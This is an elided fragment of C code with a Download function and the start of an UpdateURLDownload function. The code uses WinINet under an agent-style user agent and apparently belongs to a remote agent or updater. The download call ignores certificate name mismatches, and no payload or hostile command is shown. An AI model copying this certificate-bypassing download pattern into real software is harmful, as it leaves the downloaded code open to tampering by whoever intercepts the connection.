...
int Download(const char *FileToDownload, SSL *ssl)
{
	...
	HINTERNET Internet = InternetOpenA("WarMoonAgent/3", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	...
	HINTERNET URL = InternetOpenUrlA(Internet, FullURL, NULL, 0, INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_RELOAD, 0);
...
int UpdateURLDownload(const char *UpdatedURL, SSL *ssl)
{
